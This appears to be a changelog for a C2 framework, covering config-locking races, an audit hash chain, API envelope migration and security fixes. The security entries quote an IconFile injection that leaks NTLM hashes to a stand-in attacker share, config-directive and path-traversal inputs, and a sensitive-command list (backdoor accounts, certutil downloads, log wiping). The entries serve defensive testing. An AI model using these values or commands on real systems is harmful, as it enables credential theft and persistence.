Found while trying to test the handler: the test saw an empty socket on every dial. A regression test drives the loop — `waiting` on connect, `pong` for ping, an error frame for an unknown type, an offer buffered while the agent is absent, an empty offer rejected. `handleRDWebRTCSignal` **22% → 59%**.

- **The settings save handlers raced the beacon hot path on the live config.** `handleSaveAgentConfig`, `handleSaveServerConfig`, `handleSaveMalleableProfile` and `handleRegenerateJWT` mutated `s.cfg` (scalars, strings and the Malleable header maps) with no lock, while the config reloader swapped the same struct under `s.configMu` and ~40 read sites — the per-beacon malleable wrapper, the auth session path, the metrics collector, the settings page itself — read it under `RLock`. A save landing next to a beacon was a data race on live config state, and the settings page handed the Malleable header maps to the template **by reference**, so a concurrent save replaced a map the render was still walking. The save handlers now hold `s.configMu` across mutate → validate → save (one atomic window; the file watcher's reload takes the same lock and can no longer observe a half-applied edit), the settings page and the `/api/settings` JSON endpoint read a single locked snapshot, and the composed threshold getters (`offlineThreshold`/`staleThreshold`/`offlineThresholdFor`, the retention getters) take the lock exactly once through an unlocked core — nested `RLock` calls would have deadlocked the moment a writer queued between them. `go test -race ./internal/server/...` is green; `settings_config_race_test.go` pins the save-vs-beacon-reader and save-vs-settings-page overlaps.
- **The DNS C2 surface had the same race class.** The `s.dnsListener` pointer was read by the status poll, swapped by start/stop and closed by shutdown with no lock at all, and `handleDNSStart` mutated the DNS config fields under `cfg.Lock()` — a *different* mutex than the `configMu` every other config reader holds, so the two never excluded each other; a console polling `/api/dns/status` raced any start/stop on both the pointer and the config. The pointer now moves under a dedicated `dnsListenerMu` (held across check → bind → publish, which also closes a start/start TOCTOU that could leak a bound socket), the DNS config fields move under `configMu` like every other field, and the extra-listener and generate paths read them under `RLock`. `dns_handler_race_test.go` pins both overlaps.
- **The remaining readers of settings-writable config completed the discipline.** The SPA middleware's `malleableEnabled()`, the `logging.level` reload hook, the TCP accept loop's error log, the shell / agent-config / generate page renders, the audit page's auth flag, the password-complexity policy and the "Download Config" redaction list all read fields the settings saves (or a hot `CopyFrom`) mutate, without the lock — including the crown-jewel secret snapshot, where a torn read could have left a real secret unredacted in the download. Every one now reads under `configMu.RLock` (the TCP listener captures its bound address once, since the socket keeps it for life regardless of later edits). `go test -race ./internal/server/...` green.
- **The Rules-of-Engagement gate and auto-recon read a hot-reloadable config.** `Roe.Enabled`, `DenyCIDRs`/`AllowCIDRs`/`DenyDomains`/`AllowDomains` and `Server.AutoRecon` are swapped under `configMu` by the reload watcher's `CopyFrom`, but `checkRoE` / `checkRoELoaded` (every task-creation path) and `queueAutoRecon` (on every new beacon) read them without a lock — a torn read of a slice header could evaluate a target against a half-old/half-new allow list. The gate now snapshots the whole section under one read lock, and auto-recon reads the allowed types under the same lock, so an in-flight reload is atomic to each task decision.
- **A per-run config copy carrying a live secret could have been committed.** `.gitignore` excluded only `config.yaml`, so `config.audit.yaml` (a copy with a plaintext `jwt_secret`) sat untracked-but-addable at the repo root — one `git add -A` would have committed it. `config.*.yaml` is now ignored, with the shipped `config.example.yaml` kept as the exception.
- **The last unlocked config readers, and a gate so the class cannot come back.** Beyond the settings/DNS/RoE surfaces, 83 functions still read `s.cfg` — which the reload watcher rewrites in place under `configMu` — without ever taking the lock: the shared data-dir helpers on every screenshot/upload/payload path, the seven `sync*` reload hooks, the operator-plane and metrics middlewares (both run per request), the screenshot/backup/cert/stager/phishing/redirector/update-check handlers, and the metric-alert evaluator. All 83 now either take a read-lock snapshot (`rawDataDir()`/`implantDataDir()`/`backupDir()`/`backupKeyHex()`/`phishingBaseURL()`/`lportFwdAllowed()`/… for the shared helpers; inline snapshots for the handlers) or carry an explicit `// config-lock:` marker naming why they cannot race (boot-only, constructor, or a caller that holds the write lock). `TestConfigReadsAreLocked` walks the package sources and fails on any function that reads `s.cfg` without the lock or a marker, so the next unlocked read breaks CI instead of shipping.

### API
- **Wrote `docs/AUDIT_INTEGRITY.md`, the operator runbook for the audit chain.** Six rounds of work produced the mechanism (hash chain), the verifier, the export (now incremental), the anchor file and the endpoint, plus the `/ready` and health surfaces — but nothing connected them into a workflow an operator could follow. The page states the threat model **in the same words as the code comment** (a partial edit is detected; a full rewrite needs the out-of-band copy), tabulates every endpoint with what it answers, explains that `anchor_matches:false` is an incident rather than a bug, and walks the before/during/after flow: record the head, extend a verified copy with `since_id`, re-verify, and report a finding as `verdict + head + exported rows` so a third party can confirm it without trusting the server. It also documents why a purge is accepted as a discontinuity at the window start and why an interior gap is not. Linked from both READMEs (the parity gate requires it in both).
- **Added `GET /api/audit/anchor`: the chain head as a citable fingerprint.** The audit chain's threat model says a party with write access can recompute every hash, so the defence is an out-of-band copy — but there was nothing convenient to archive. The endpoint returns the newest row's `id`, `entry_hash` and timestamp plus two booleans: `anchor_recorded` (an anchor file exists) and `anchor_matches` (**false** is the signature of a rewritten or replaced table). An operator can paste it into an incident report or ticket, and a later investigator has something a rewrite cannot reproduce. A fresh install with no anchor file reads as "not recorded" rather than a mismatch, and a server without a database answers 503. Documented in `api/openapi.yaml` with the types regenerated; `handleAuditChainAnchor` **88%**.
- **The audit-chain export can be incremental.** `GET /api/audit/export?since_id=N` returns only the rows with a greater id, so an investigator who already holds a verified copy fetches just what was appended — ids are monotonic, so the anchor is simply "greater than", and the first exported row still carries `prev_hash` linking to the row they already have, which is what lets the two copies be stitched together. An anchor past the end yields an empty export rather than an error, and no anchor keeps the full export. This is what makes periodic anchoring practical on a long engagement instead of re-pulling the whole table every time. Documented in `api/openapi.yaml` with the generated types refreshed. `handleExportAuditChain` **74% → 78%**.
- **The health payload is documented and its degraded paths are covered.** `HealthResponse` in `api/openapi.yaml` now describes `database`, `backup` and the new `audit_chain` object (with the 60-second cache noted), and `/api/v1/health` finally declares that response schema instead of a bare `description: OK` — so `npm run gen:openapi` produces a typed shape the console can rely on. The tests cover what an orchestrator actually meets during a partial startup: a server with no database answers **degraded/unavailable** without inventing an `audit_chain` it cannot check, and a **closed pool** still answers 200 with a status rather than 500. `apiHealth` **75% → 95%**.
- **The console health payload now carries the audit-chain verdict, cached for a minute.** `/api/v1/health` already shows database and backup freshness; it now also reports `audit_chain` (`ok`, `checked`, `first_bad_id`, `reason`), so tampering is visible on the page operators already watch instead of behind a separate endpoint or a CLI. Because the console polls it, the verdict is cached for 60 s (`cachedAuditChainVerdict`) — while `/ready` deliberately keeps verifying on **every** poll, since that is what an alert fires on; a test pins that contrast (fill the health cache, tamper, and `/ready` still notices immediately). `cachedAuditChainVerdict` **100%**, `apiHealth` **75%**.
- **De-flaked the SOCKS handshake test.** `TestHandleOperatorConnRejectsBadHandshakes` passed alone but failed once in a full run: its loopback TCP waits used a 5-second window, which a loaded runner can exceed. The window is now a named `socksTestIOTimeout` (15 s) used by all eight waits in those tests — the assertions are untouched, only the patience is larger. Two consecutive full runs are clean.
- **Guarded the deadlock class instead of just the one instance.** `validateAndSaveConfigLocked` audits **while the caller holds `configMu` for write**, which is exactly what hung the suite for 900 seconds when the audit path briefly took `configMu.RLock`. The audit path no longer takes that lock, but nothing stopped the next person from adding one. A regression test now saves the config under a held write lock with a **five-second deadline**, so a reintroduction fails loudly instead of hanging the whole suite; it also asserts the save is still audited.
- **`GET /api/audit/export` is in the OpenAPI spec** (`exportAuditChain`, the `limit` parameter, and the NDJSON response), with `src/lib/api-schema.d.ts` regenerated so `check:openapi-types` stays green.
- **The audit chain can now be exported for offline verification.** `GET /api/audit/export` streams the chain as NDJSON with every hashed field plus `prev_hash`/`entry_hash`, so an investigator (or a third party) can recompute it with no database access — and a later rewrite of the whole table cannot match the copy they hold. That matters because the chain's hash is **unkeyed**: it detects partial edits, not a full recompute. The threat model is now written down in the `verifyAuditChain` doc comment and in a new `AGENTS.md` section, so nobody over-claims what the chain proves. The export test recomputes every hash from the file alone and checks the linkage, then proves an edited row no longer matches.
- **`/ready` now reports audit-chain integrity.** A tampered log is now visible to whatever polls the health endpoint, instead of waiting for an investigator to open a console page. The check walks the newest 200 rows (cheap on a poll every few seconds), surfaces `checks.audit_chain` plus a `warnings` entry on failure, and **deliberately keeps the server ready**: a tampered log is an alarm about the past, and taking the C2 offline over it would be the wrong response. The finding is logged and audited **once per bad row**, so a probe cannot spam the log. `handleReadyCheck` **95%**, `noteAuditChainTamper` **91%**.
- **`GET /api/audit/verify` is in the OpenAPI spec** (`verifyAuditChain`, with the `limit` parameter and the verdict shape), and `src/lib/api-schema.d.ts` is regenerated so `check:openapi-types` stays green.
- **The "tamper-evident" audit chain could not be verified — nothing ever checked it.** `auditEntryHash` builds a hash chain over every entry, six comments call it tamper-evident, and the 90-day retention floor exists specifically to protect it, but there was **no verifier anywhere**: a hand-edited row, a deleted row or a reordered one went unnoticed forever. Added `verifyAuditChain(limit)`, which walks the newest rows in id order and checks both properties the chain exists for — each row's `EntryHash` still matches its own content, and each row's `PrevHash` names the previous row's hash (with the row just before the window as the anchor, so the first checked row is verified too) — plus a read-only `GET /api/audit/verify` under the existing audit-read permission. A broken chain answers **200 with `ok:false`** (a forensic finding, not a server error) and records the failure in the audit log itself. Tests cover an intact chain, an edited row, a deleted row, a swapped hash, the empty table, a nil server, and the endpoint end to end. `verifyAuditChain` **88%**, `handleVerifyAuditChain` **100%**; `internal/server` **65.6% → 65.7%**.

- **Success responses now have one shape: `{"success": true, "data": ...}`.** `respond()` wraps the payload exactly once and `respondSuccess()` is gone, so a handler can no longer emit a bare payload while another emits the envelope. The 87 sites that hand-built `respond(c, gin.H{"success": ...})` are migrated (the two whose payload was a nested `data` map now pass the inner map), including the multi-line ones. `respondError` already produced `{"success": false, "error": ...}`, so the contract is now symmetric.
- **Two real UI bugs fell out of the migration.** `/stager/tokens` and `/redirectors` returned their list under `data`, but the pages read `res.success ? res.data : []` / `data.redirectors` *after* `api.ts` had already unwrapped the envelope — so the stager token list and the redirector list were **always empty**. The stager page now reads the array directly and `/redirectors` returns `{redirectors, total}` (the key the page actually reads); the Go test that pinned the old `data` key was updated with it.
- **The OpenAPI spec now documents the envelope it actually sends.** 108 JSON 200 schemas still described the bare payload, `SuccessResponse` was the stale `{success, message}` and the spec's own `version` said 2.6.2. Every JSON 200 schema is now `allOf: [SuccessResponse, {data: <payload>}]`, `SuccessResponse` carries `data`, the spec version matches `VERSION`, and `scripts/apply-openapi-envelope.mjs` (with `--check`) runs as `check:openapi-envelope` inside `npm run check` — so a new handler or a re-added bare schema fails the gate instead of drifting silently. `check:openapi-types` only compared the spec to the generated types, which is why this went unnoticed.
- `TestSuccessEnvelope` is the ratchet for the remaining half: it rejects any hand-built envelope outright and pins the per-file count of raw `c.JSON(http.StatusOK, ...)` sites in `internal/server/envelope_baseline.txt`, failing when a file grows (new debt) or shrinks (stale baseline). **The migration is now complete**: 336 sites at the start, and the baseline holds only five documented exceptions — `respond()` itself, the four REST v1 list endpoints whose `{success, data, total}` shape is published in `api/openapi.yaml`, the external-C2 protocol reply struct, the page-document renderer, and `/health` (container and deploy probes read `status`/`version`/`uptime` at the top level). Each carries its reason in the baseline file.
- **Batch 1 of the migration: settings, monitor, task acks.** `handlers_settings.go` (9 sites) now returns `{message}` / `{}` payloads, `handlers_monitor.go` (17) is fully converted, and the shared task-ack emitters (`task_dispatch.go`'s `{task_id}` and `handlers_files.go`'s `ls`/`push` acknowledgements) moved to `respond`, so every file operation now yields one shape. The REST v1 *list* endpoints in `api.go` deliberately stay on the documented `{success, data, total}` body (recorded in `api/openapi.yaml`); their single-object siblings were byte-identical and moved to `respond`.
- **Two more latent UI bugs, same family.** `/api/automation/rules` returned its list under `data` while the page reads `rules ?? data` off the *unwrapped* payload, and `/api/webhooks` did the same — so the automation rules and webhooks lists rendered empty. Both now return the keyed payload the page reads (`{rules, total, page, page_size}` / `{webhooks}`).
- **Batch 2–4: dashboard, users, listeners.** `handlers_dashboard.go` (8 plain payloads, byte-identical through `respond`), `handlers_users.go` (7 message acks), `handlers_listeners.go` (6: the list now returns `{listeners, total, page, page_size}`, detail keeps `{listener, agents, total, active}`, enable/disable return `{message}`) and `handlers_automation.go` (5 remaining) are at zero raw 200s. Baseline: **336 → 201**.
- **A fifth empty-list bug and a test-isolation fix, both found while converting.** The users page read `d.success`/`d.data` off the already-unwrapped `/api/roles` response, so the custom-role list in the user dialog was always empty; it now reads the array directly. `TestHandleDashboardCredentialTypes` only passed when another test in the package had already initialized loot encryption and left implant rows behind — it now initializes both itself and passes standalone.

### Fixed

- **BOF uploads were rejected outright.** `handleBOFUpload` called `validateUploadExtension(file.Filename, ".o,.obo")`, but the first argument is the allowlist *key*, not the filename: the lookup fell through to the generic text allowlist, which never matches `.o`, so every upload answered 400 "file extension not allowed". It now passes `("bof", file.Filename)`, using the `bof` allowlist that already existed. Regression tests cover a COFF object succeeding plus a PE-as-BOF and an `.exe` being rejected by the magic/extension gates.
- **Four handlers read a context key that is never set.** They asked for `c.GetString("username")` while the auth middleware only sets `"user"`, so the value was always empty: `db.BOFFile.CreatedBy` (upload and repo import), `db.Script.CreatedBy`, and the `scripting.Caller.Username` handed to the script engine. All four now read `"user"`.

### Security
- **A survey of goroutines found 63 without a recover, and the gate freezes that set instead of pretending to fix it.** Go has no process-wide panic handler, so a panic in **any** goroutine takes the server down. The survey covered `internal/server`; the two sites that looked worst turned out to be **guarded by design rather than by `recover`**: `wsReadPump`/`wsWritePump` handle their own, and the AI broker's retry worker `select`s on `dst.done`, so a racing unsubscribe drops the event instead of panicking on a closed channel — which is exactly why a blanket "add recover everywhere" rule would be wrong. **New gate `check-goroutine-recovery`** freezes the **13** current sites in `handlers_*.go` (the files a malformed request reaches) and **refuses new ones**: a request-path goroutine must defer a recover or be incapable of panicking. The list is documented as **shrink-only**, and the reason each frozen site is safe lives next to it. Wired into both lists: **29 / 29** and **25 / 25**.
- **The outbound-client guard existed twice, and only one copy was ever fixed — so it now exists once.** `ssrfSafeClient` and `aiSSRFClient` were the same four-line construct (`nil` → `http.DefaultClient`, copy its `Timeout`, cap redirects) written in two files; rounds 232 and 233 fixed the zero-timeout hole **one at a time**. Both now call a single `guardedClient(base, fallbackTimeout, validate)` in `guarded_client.go`, so a fix lands in both and the only difference left is the parameter the callers legitimately disagree on (the short or long fallback, and the validator). **New gate `check-guarded-clients`** fails if `Timeout: base.Timeout` or `base = http.DefaultClient` appears anywhere outside that file, which is what makes "fix both copies" unnecessary in future. **Evidence:** replacing the AI client's body with a hand-rolled copy makes the gate report `2 outbound client(s) bypass guardedClient: ai_endpoint_guard.go:187: return &http.Client{Timeout: base.Timeout}`; the real tree reports `OK (one guardedClient implementation, no copies)`. Existing tests for both clients still pass unchanged. Wired into both lists: **28 / 28** and **24 / 24**.
- **`check:http-status` — the GeoIP lookup was the one outbound call that never looked at its status, and `ip-api` fails with a 200.** Thirteen outbound calls in the server inspect `resp.StatusCode`; `lookupGeoIP` decodes the body regardless, so **an exhausted free tier (HTTP 429) and a rejected lookup (`{"status":"fail"}` with HTTP **200**) both turned into empty fields with no explanation anywhere. It now checks both the status and the body's own `status` field and logs the reason at debug. **New gate `check:http-status`** requires a `StatusCode` check within 45 lines of any `http.Client.Do` / `http.Get/Post/Head/PostForm` call, so the next unchecked call fails the build. **Evidence:** written after a probe found `beacon_files.go:146` as the only unchecked site; stashing the fix makes the gate fail with `beacon_files.go:146: resp, err := s.httpClient.Do(req)`, restoring it reports `OK (13 outbound call(s) inspect the response status)`. Wired into both lists: **27 / 27** and **23 / 23**.
- **`check:discarded-results` — the gate for the shape four rounds in a row found by hand.** The same defect kept reappearing: a send/dispatch call whose error was thrown away, so the feature reported success while nothing happened — the automation script's result discarded (round 224), `create_task`/`set_sleep` skipping silently (225), the webhook response never inspected so a 500 looked like a 200 (226), and `_ = s.sendNotificationRoute(...)` leaving a notification that existed in the console and never reached the channel (227). A discarded error is invisible at the call site **and** in the UI, so it needs a gate rather than another review. `frontend/scripts/check-discarded-results.mjs` fails on `_ = <receiver>.<deliveryVerb>…(` (send/deliver/dispatch/notify/push/post/webhook/execute) and on a **bare call** to a known error-returning delivery function; `_ = json.Unmarshal(…)` and close/flush style ignores are not matched, and the allowlist is **empty with a warning that allowlisting a whole file defeats the check** — the first version allowlisted the notification file and let a probe re-introduce the exact defect it was written for. **Evidence:** injecting `_ = s.sendNotificationRoute(route, n)` into `handlers_notification_routes.go` makes the gate fail with `result discarded: _ = s.sendNotificationRoute(route, n)`; the real tree reports `OK (no delivery result is discarded)`. Wired into both lists: **26 tasks / 26 labels** and **22 / 22**.
- **A fail-open branch in the AI tool authorizer is currently unreachable — now that is enforced.** `authorizeAITool` begins with `if reqCtx == nil || reqCtx.Principal.UserID == 0 { return true, "" }`, so a **zero principal is allowed**: no policy lookup, no permission check, no approval intent. Every other scoping helper here fails **closed** (`tenantScope`, `resolveTenant`, `lookupTenantID`), which makes this one a trap — a background AI job or a "quick" call site passing nil would get unrestricted tool execution, `execute_command` and `delete_listener` included. I checked who passes nil: **all 11 callers of the `executeToolSwitch` wrapper are in `_test.go` files**, so the branch is unreachable today. Instead of flipping it and breaking those tests, the new `TestNilAIToolContextStaysOutOfProduction` scans every non-test file and fails if production code reaches `executeToolSwitch`, `executeToolSwitchCtx(nil,` or `executeToolCtx(nil,` — and it **logs a note when the last test stops using the wrapper**, so the escape hatch can be deleted deliberately. **Evidence:** the scan flagged `ai_tools_defs.go:831` (the wrapper's own body) until the wrapper was excluded by signature, then passed.
- **Six AI tool bodies do not scope by tenant, and all six are `GlobalOnly` — now guaranteed.** A sweep of the 31 `executeToolSwitchCtx` cases for a `Principal.TenantID` filter (or `resolveAIAgentID` / `principalAgentIDs` / `tenantScope`) leaves six: `get_online_operators`, `create_automation_rule`, `save_engagement_note`, `generate_report`, `get_situation`, `get_alerts`. Every one is `GlobalOnly: true` in `aiToolPolicies`, which makes `authorizeAITool` refuse it for any non-zero tenant, so none of them leaks across tenants today — but three of the six **write or aggregate** (`create_automation_rule`, `save_engagement_note`, `generate_report`), and "it happens to be safe" is the property that should fail loudly when a seventh arrives. **New guard:** `TestUnscopedAIToolsAreGlobalOnly` requires every unscoped case to be `GlobalOnly`, with one documented exception (`get_situation` hands `reqCtx` to a collector that scopes inside). **Evidence:** dropping `GlobalOnly` from `generate_report` makes it fail with `[generate_report]`; restored, it passes. Worth recording: my first sweep flagged five *mutating* AI tools as "no approval gate" — the gate is central (`authorizeAITool`) and runs before dispatch, which is why the body-level check was misleading.
- **The AI tool surface now has a parity guard, and the round's two suspicions were both wrong.** I went looking for mutating AI tools with no approval gate: five of seven (`create_listener`, `delete_listener`, `run_macro`, `bulk_task_action`, `create_automation_rule`) have **no gate in their `case` body** — but the gate is **central**, in `authorizeAITool`, which runs before dispatch and refuses any tool missing from `aiToolPolicies` (fail-closed), checks `policy.Permission`, and creates an approval intent for anything that is not read-only or an opted-in low-risk write. Every one of those five names its permission and a non-read risk. Second suspicion — that `execute_command` might be a way around `agents.write` — was already answered last round. So this round lands a **guard instead of a fix**: a test that the `executeToolSwitchCtx` cases (plus the two tools dispatched before it, `search_knowledge` and `web_search`) and the `aiToolPolicies` map are **the same set**, because both mismatches are real bugs — a case with no policy is **refused at runtime**, and a policy with no case is **advertised, approved by a human, then answers "unknown tool"**. **Evidence:** renaming `set_sleep`'s case makes the test report both directions (`set_sleep_probe` has no policy; `set_sleep` has no implementation). A second test requires every non-read policy to name a permission and a known risk level, so the approval decision cannot fall through.
- **The AI shell tool's "sensitive command" gate was wrong in both directions.** `isSensitiveCommand` decides whether an AI-driven command goes to a human before it runs (`ai.allow_execute` is only a subset gate). It matched with `strings.Contains`, so the `sam` keyword also matched **`same`, `sample` and `samsung`** and held benign commands — and the list held **only credential dumpers**, so `net user backdoor /add`, `schtasks /create`, `wevtutil cl Security`, `cipher /w:C:`, `rm -rf`, `certutil -urlcache` and `wmic` passed the gate untouched, which is exactly the set that turns access into persistence. Matching is now by **token** (or by **phrase** over the padded normalised text), the list covers account/privilege changes, persistence, evasion, impact and LOLBin shims alongside the credential tools, and phrase keys are spelled the way normalisation leaves them (`rm rf`, not `rm -rf`) — the hyphenated key **never matched**, which is how `rm -rf /var/log` slipped through. **Evidence:** the new `TestIsSensitiveCommandBothDirections` feeds 15 dangerous and 9 benign commands and fails on either miss; it caught `rm -rf` on its first run. Also verified while building it: `execute_command` defaults to `pending_approval` unless `allow_execute` is on **and** the command is not sensitive **and** the global two-man rule allows it, so the AI tool path is **not** a shortcut around `agents.write`.
- **Two sidebar entries were gated by permissions their pages do not use.** The nav hides items whose `perms` an operator lacks ("any-of"). The keys are typed, so a typo is a compile error — but **nothing compared them to the backend**, and a probe that maps each nav path to its `/api/<segment>` routes found two disagreements: **`/dns` had no perms at all** while every `/api/dns/*` route requires `listeners.read`, and **`/ai` required `settings.read`** while its page handler and `/api/ai/runs` require `ai.use`. The built-in `user` role carries all three, so this only bit **custom-role** deployments: a DNS page whose every request answers 403, and an AI page a role holding `ai.use` could call but never reach. Both entries now list what the API actually checks. **New gate `check:nav-perms`** parses the route groups (`X.Use(RequirePermission(db.PermFoo))` plus inline overrides) and compares the first path segment — **17 of 44** nav items have an exact/agreeing backend route and are checked; the rest are counted, not guessed. Two details worth keeping: it resolves `PermFoo` to its string through `internal/db/models.go`, because a CamelCase guess turned `PermAIUse` into `AIUse` and reported a **false** mismatch; and the gate was wired into both task lists by editing `package.json` as **text**, since a JSON round-trip rewrote unrelated formatting and the first attempt split a task in half (`Missing script: "check:permissions npm:check:nav-perms"`). **Evidence:** reverting the `/dns` fix makes the gate fail with `the sidebar shows it to everyone, but /api/dns requires listeners.read`; with it, `OK (17 of 44 …)`. Both lists pass at **25** tasks and **21** tasks.
- **Both ISO builders accepted any name and produced images no client could mount.** `BuildISO9660` and `BuildISOWithLNK` upper-cased whatever they were given and appended `;1` with **no length or character check**, then wrote it into the ISO 9660 directory record — so a 300-character name, one containing a separator, or a non-ASCII one produced a **malformed record**, and the operator shipped a broken image to a target and only discovered it when it would not open. A shared `isoEntryName` now normalizes and validates (1–64 chars, `A-Z 0-9 . _ -` only, no space/separator/semicolon) and returns an error that the delivery handler surfaces as 400. **Evidence:** the new test feeds six bad names to both builders and requires a refusal — with the change reverted, `BuildISO9660("a/../../etc/passwd")` is accepted — then verifies the valid path is still a real image: the normalized `REPORT.TXT;1` appears in the bytes, the size is a whole number of 2048-byte sectors, and the primary volume descriptor still carries the `CD001` magic and the 2048 block size.
- **The `.url` generator could be turned into an INI-injection primitive.** `BuildURLShortcut` was a bare string concatenation — `"[InternetShortcut]\r\nURL=" + targetURL + "\r\n"` — and a `.url` file is an **INI document**, so a target carrying a line break adds **keys**. The dangerous one is `IconFile`: `URL=http://x\r\nIconFile=\\\\attacker\\share\\i.ico` makes Windows Explorer **fetch that icon when the file is viewed**, handing the operator's NTLM hash to the attacker just by looking at a shortcut they were sent. The builder now takes the target through a check (non-empty, absolute, **no control characters**) and returns an error; the delivery handler surfaces it as a 400 and also refuses a newline in `filename` (it reaches the HTML `download` attribute) or a NUL in `command`. **Evidence:** the new test feeds all three line-break shapes plus empty/relative targets and requires a refusal, and asserts the accepted shortcut has exactly **two** CRLFs — a third would be an injected key. (My first version of that assertion wanted three and failed; the code was right, the expectation was not.)
- **The redirector config generators emitted whatever a request body contained, so the output could carry injected directives.** `handleGenerateNginx`/`Apache`/`HAProxy` feed a JSON body straight into templates that write nginx/apache/haproxy syntax with no escaping: `domain: "c2.example.test;\n    server attacker.example;"` produced a config the operator would paste onto their own redirector **with the extra directive in it**. Nothing there is reachable without an operator, but "the tool emitted an injectable config" is still a defect in the tool — and the same fields can arrive from a saved template or an AI tool call. A new `validateRedirectorConfig` rejects a domain that is not a bare hostname, a non-http(s) `backend_url`, `extc2_paths` that are not plain `/…` paths, `blocked_ips` that are not IPs/CIDRs, a multi-line `user_agent`, and cert/key paths containing directive characters. **One detail worth keeping:** my first version validated the **trimmed** domain, so `"c2.example.test\n"` passed and the generator wrote the newline into the directive — the check now validates the **raw** value, which is what the generator actually receives. **Evidence:** with the handlers reverted, haproxy answers 200 with `# Generated for domain: c2.example.test;\n    server attacker.example;`; with the check, 400.
- **The last three label tables gained a tenant column, closing the final documented gap.** `agent_tags`, `agent_groups` and `auto_tag_rules` carried no tenant at all, so every tenant listed, renamed and deleted every other tenant's labels, and a **globally unique tag name** meant tenant B could not even create a tag tenant A already had. They now have `tenant_id` (uniqueness moved to `(tenant_id, name)`), every list/update/delete/apply path runs through `tenantScope`, and creation stamps the caller's tenant. `handleAutoTagCreate` binds the **whole model** from JSON, so the tenant is **forced** after binding rather than trusted from the body — a caller could otherwise file a rule into another tenant by sending `tenant_id`. The auto-tag **apply** loop now evaluates only the caller's rules against only the caller's agents, which is what closed the engine-level gap rather than just the CRUD surface. `check:owner-scope` now requires `tenantScope` for these three (its group/tag allowlist entries are gone), and it accepts `currentTenantID` **only** on a handler that also creates — a create cannot scope a row that does not exist yet. **Tests:** tenant 1 creates a tag and a group, tenant 2 sees neither, **can reuse the same tag name**, and tenant 1 still sees its own.
- **The route gate counted scoping helpers as authorization.** After `/emergency-stop` was found passing on `currentUserID` alone, the same question applied to the rest of `GATE_MARKERS`: `tenantScope`, `findTenantOrFail` and `getAgentOrFail` **scope or resolve**, they do not authorize, so a mutating handler whose only "gate" was one of them would pass while any authenticated role of that tenant could run it. Measured before removing them: with all three deleted from the list, **all 402 mutating routes still pass**, so nothing depended on them — the previous list was overstating what those routes check rather than masking a live hole. They are gone, and the script now **refuses to run** if any scoping-only helper is added back (`currentUserID`, `tenantScope`, `auditTenantScope`, `aiTenantScope`, `findTenantOrFail`, `getAgentOrFail`, `findOrFail`) — a gate about the gate, proven by re-adding `requireAdmin` to that list and watching it fail with `"requireAdmin" scopes or resolves but does not authorize`. Also verified this round, and **not** a defect: group and auto-tag mutations already sit behind `PermGroupsWrite` / `PermSettingsWrite`, so the remaining "global table" gap is a deliberate permission design, not an oversight.
- **Any authenticated operator could arm the kill switch for the whole installation.** `handleEmergencyStop` re-authenticated the caller with their own password but never checked a **role**, so a read-only operator who knew their password could set `kill_date` on every online implant — and the targeting query had **no tenant scope**, so a tenant-scoped admin's "emergency stop" would also have terminated every other tenant's beacons. It now requires an **admin** and applies `tenantScope`. This was invisible to `check:route-auth` because that gate counted `currentUserID` as an authorization marker: the call **resolves** the caller (and fails closed without one) but authorizes nothing. That marker is gone, so the next handler relying on it will be flagged. **Evidence:** with the fix stashed, a plain-user context gets `200 {"agents_killed":2,"message":"Emergency stop activated"}`; with it, **403**, no kill date armed, and a tenant-2 admin's stop leaves tenant 1's agent untouched while stopping its own. Two older tests needed the role in their context, which is exactly the contract change the fix makes.
- **Agent tags leaked one tenant's classification of another tenant's hosts.** Both tag readers take agent ids from the request — a path parameter in the single form, a JSON list in the batch form — and `agent_tags` has no tenant column to scope through, so neither handler checked anything: tenant 2 could ask which tags tenant 1 had put on a host, and the batch endpoint answered for any id list at all. The single form now resolves the agent through `getAgentOrFail` (404 for a foreign id), and the batch form narrows the id list with a tenant-scoped `implants` subquery before reading assignments — one query, no N+1. **Evidence:** with the fix stashed, tenant 2's read answers `200 {"tags":[{"name":"sekrit-tag",…}]}`; with it, 404, and the batch form returns nothing for the foreign id, while tenant 1 still reads its own agent's tags. Worth recording from the same sweep: `/api/tags` custom-role create/update/delete are already **admin-only**, so the escalation path I expected there does not exist, and the remaining unscoped surface is now the auto-tag *engine* (global rules applied by a global loop) plus group membership, both tracked in the `AGENTS.md` table.
- **A tenant could execute another tenant's workflow against that tenant's implants.** Workflows are executable automation: running one **creates tasks** on the agents it targets. The execute handler loaded the workflow by id with no scope **and** resolved its targets (explicit ids, tags, groups, and the "recently seen" default) across every tenant — so tenant 2 could run tenant 1's workflow and have it fire on tenant 1's hosts. Ownership now runs through `created_by` via the shared `creatorScope`, and the four target-resolution branches are tenant-scoped in one helper (`workflowTargetAgents`), so a workflow's own `scope_ids` cannot name another tenant's hosts. List, detail, toggle, update, delete and execution are scoped; toggling now updates the single column instead of `Save`-ing a struct with preloaded steps (the association made a full save rewrite child rows, which is wider than intended). The new test asserts the concrete harm: tenant 2's execute answers **404** and the foreign agent has **zero tasks**; the toggle leaves `enabled` unchanged; list and delete do not see the row. Two things I got wrong on the way, both worth remembering: `First(&x, "string-key")` passes the string as **raw SQL** (SQLite reported `no such column: wf`), so string primary keys need `Where("id = ?")`; and a stash-based proof needs the helper file moved too, since reverting only the handler leaves the untracked helper uncompiled.
- **Phishing templates and campaigns were readable, editable, deletable and *launchable* across tenants.** On this surface an unscoped row is not merely visible: the **template holds the landing page that captures credentials** and the **campaign holds the SMTP settings and the target list**, so a foreign row could be re-pointed at the attacker. Both tables carry `created_by`, so ownership now runs through it via a **shared `creatorScope`** — the same rule that `scripts` and `bof_files` needed, extracted once instead of copied a third and fourth time (both existing helpers now delegate to it). The template list, the campaign list, template update, template **delete**, campaign launch and campaign stop are all scoped. **Evidence:** with the fix stashed the template list hands tenant 2 `{"subject":"sekrit-subject","body":"<p>sekrit-page</p>"}`; with it, tenant 2 sees neither row, cannot rewrite the landing page, cannot delete the template, and launching the foreign campaign answers **404**. Two follow-ups were needed in older tests: three campaign/template fixtures had **no owner**, and a row with an empty creator is correctly invisible to a scoped caller — the fixtures now record one, which is the behaviour the fixtures were meant to exercise.
